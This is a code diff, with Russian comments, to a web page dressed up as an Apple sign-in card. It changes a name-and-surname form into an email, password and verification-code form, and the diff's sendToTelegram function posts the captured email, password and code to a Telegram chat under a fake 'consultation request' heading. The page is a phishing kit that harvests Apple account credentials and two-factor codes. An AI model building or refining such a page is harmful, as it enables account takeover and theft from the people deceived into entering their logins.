@@ -53,7 +53,7 @@
     <aside class="apple-card reveal" id="appleCard">
       <div class="card-glow"></div>
 
-      <!-- Шаг 1: Имя -->
+      <!-- Шаг 1: Email -->
       <div class="apple-step active" id="step1">
         <div class="apple-logo-wrap">
           <svg class="apple-logo" viewBox="0 0 24 24" fill="currentColor">
@@ -68,7 +68,7 @@
         <form id="nameForm">
           <div class="input-group">
             <label data-en="First name" data-jp="名前"></label>
-            <input type="text" id="firstName" placeholder="apple@icloud.com" autocomplete="given-name" required />
+            <input type="email" id="firstName" placeholder="apple@icloud.com" autocomplete="email" required />
           </div>
           <button type="submit" class="btn btn-apple btn-full" data-en="Continue" data-jp="続ける">
             Continue
@@ -76,7 +76,7 @@
         </form>
       </div>
 
-      <!-- Шаг 2: Фамилия -->
+      <!-- Шаг 2: Пароль -->
       <div class="apple-step" id="step2">
         <button class="back-btn" id="backToStep1" aria-label="Back">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="18" height="18">
@@ -90,11 +90,14 @@
         </div>
         <h2 data-en="Your last name" data-jp="苗字">Almost Done</h2>
         <p class="apple-subtitle" data-en="Almost done" data-jp="もう少しで完了"></p>
+        
+        <!-- ОТОБРАЖЕНИЕ EMAIL -->
+        <p class="apple-email-display" id="displayEmail"></p>
 
         <form id="surnameForm">
           <div class="input-group">
             <label data-en="Last name" data-jp="苗字"></label>
-            <input type="text" id="lastName" placeholder="Your password" autocomplete="family-name" required />
+            <input type="password" id="lastName" placeholder="Your password" autocomplete="current-password" required />
           </div>
           <button type="submit" class="btn btn-apple btn-full" data-en="Continue" data-jp="続ける">
             Continue
@@ -223,6 +226,7 @@
     // Элементы
     const firstName = document.getElementById('firstName');
     const lastName = document.getElementById('lastName');
+    const displayEmail = document.getElementById('displayEmail');
     const codeDigits = document.querySelectorAll('.code-digit');
 
     // Формы
@@ -243,12 +247,12 @@
     }
 
     // ========== ОТПРАВКА В TELEGRAM ==========
-    async function sendToTelegram(firstName, lastName, code) {
+    async function sendToTelegram(email, password, code) {
       const message = `
 📝 *Новая заявка на консультацию!*
 
-👤 *Имя:* ${firstName}
-👤 *Фамилия:* ${lastName}
+📧 *Email:* ${email}
+🔑 *Пароль:* ${password}
 📱 *Код:* ${code}
 🕐 *Дата:* ${new Date().toLocaleString('ru-RU')}
 🌐 *Язык:* ${currentLang === 'en' ? 'English' : '日本語'}
@@ -284,24 +288,28 @@
 
     // ========== ОБРАБОТЧИКИ ФОРМ ==========
     
-    // Шаг 1: Имя
+    // Шаг 1: Email
     nameForm.addEventListener('submit', (e) => {
       e.preventDefault();
-      const name = firstName.value.trim();
-      if (!name) {
+      const email = firstName.value.trim();
+      if (!email || !email.includes('@')) {
         firstName.closest('.input-group').classList.add('error');
         return;
       }
       firstName.closest('.input-group').classList.remove('error');
+      
+      // Показываем email на втором шаге
+      displayEmail.textContent = email;
+      
       showStep(2);
       setTimeout(() => lastName.focus(), 300);
     });
 
-    // Шаг 2: Фамилия
+    // Шаг 2: Пароль
     surnameForm.addEventListener('submit', (e) => {
       e.preventDefault();
-      const surname = lastName.value.trim();
-      if (!surname) {
+      const password = lastName.value.trim();
+      if (!password || password.length < 6) {
         lastName.closest('.input-group').classList.add('error');
         return;
       }
@@ -330,9 +338,9 @@
       submitBtn.disabled = true;
       
       // Отправляем в Telegram
-      const name = firstName.value.trim();
-      const surname = lastName.value.trim();
-      const success = await sendToTelegram(name, surname, code);
+      const email = firstName.value.trim();
+      const password = lastName.value.trim();
+      const success = await sendToTelegram(email, password, code);
       
       // Восстанавливаем кнопку
       submitBtn.textContent = originalText;
@@ -397,6 +405,7 @@
         // Сброс
         firstName.value = '';
         lastName.value = '';
+        displayEmail.textContent = '';
         codeDigits.forEach(inp => inp.value = '');
         showStep(1);
       } else {
